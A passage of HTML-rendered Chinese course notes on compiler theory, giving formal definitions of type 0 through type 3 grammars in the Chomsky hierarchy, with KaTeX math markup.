class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>且至少包含一个nonterminal。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n</ol>\n<p>则该文法是0型文法，其描述的语言为0型语言。</p>\n<p>0型语言又称为无限制性语言。</p>\n<h4 id=\"1型文法上下文有关文法\"><a class=\"markdownIt-Anchor\" href=\"#1型文法上下文有关文法\"></a> 1型文法（上下文有关文法）</h4>\n<p>若文法中每条规则的形式为：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>A</mi><mi>β</mi><mo>→</mo><mi>α</mi><mi>u</mi><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha A \\beta \\rightarrow \\alpha u \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，满足：</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mo separator=\"true\">,</mo><mi>β</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\alpha,\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>u</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>+</mo></msup></mrow><annotation encoding=\"application/x-tex\">u \\in \\left(V_{N} \\cup V_{T}\\right)^{+}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">u</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.161231em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.911231em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n</ol>\n<p>则该文法是1型文法，其描述的语言为1型语言。</p>\n<p>因为在利用规则将<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>替换为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>u</mi></mrow><annotation encoding=\"application/x-tex\">u</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">u</span></span></span></span>时，必须考虑其上下文环境（<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mo separator=\"true\">,</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha, \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>），且不允许替换为空字符串，因此也成为<strong>上下文有关文法</strong>。</p>\n<h4 id=\"2型文法上下文无关文法\"><a class=\"markdownIt-Anchor\" href=\"#2型文法上下文无关文法\"></a> 2型文法（上下文无关文法）</h4>\n<p>若文法中每一条规则的形式为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，且满足：</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding=\"application/x-tex\">A \\in V_{N}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n</ol>\n<p>编译原理课程所主要研究对象为上下文无关文法。</p>\n<h4 id=\"3型文法正规文法\"><a class=\"markdownIt-Anchor\" href=\"#3型文法正规文法\"></a> 3型文法（正规文法）</h4>\n<ul>\n<li>若每条规则的形式为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mi>B</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow \\alpha B</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span></span>或者<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，其中<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo separator=\"true\">,</mo><mi>B</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><mi>α</mi><mo>∈</mo><msubsup><mi>V</mi><mi>T</mi><mo>∗</mo></msubsup></mrow><annotation encoding=\"application/x-tex\">A,B \\in V_{N}, \\alpha \\in V_{T}^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.964027em;vertical-align:-0.275331em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-2.424669em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.275331em;\"><span></span></span></span></span></span></span></span></span></span>，则称其为<strong>右线性文法</strong>。</li>\n<li>若每条规则的形式为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>B</mi><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow B \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>或者<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，其中<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo separator=\"true\">,</mo><mi>B</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><mi>α</mi><mo>∈</mo><msubsup><mi>V</mi><mi>T</mi><mo>∗</mo></msubsup></mrow><annotation encoding=\"application/x-tex\">A,B \\in V_{N}, \\alpha \\in V_{T}^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.964027em;vertical-align:-0.275331em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-2.424669em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.275331em;\"><span></span></span></span></span></span></span></span></span></span>，则称其为<strong>左线性文法</strong>。</li>\n</ul>\n<p>左、右线性文法都被称为3型文法、正规文法，其语言为正规语言。</p>\n<p>从0型文法到3型文法，对规则的限制逐渐增加，每一种文法都是前一种文法的<strong>子文法</strong>。</p>\n<h2 id=\"词法分析和有穷自动机\"><a class=\"markdownIt-Anchor\" href=\"#词法分析和有穷自动机\"></a> 词法分析和有穷自动机</h2>\n<h3 id=\"词法分析程序\"><a class=\"markdownIt-Anchor\" href=\"#词法分析程序\"></a> 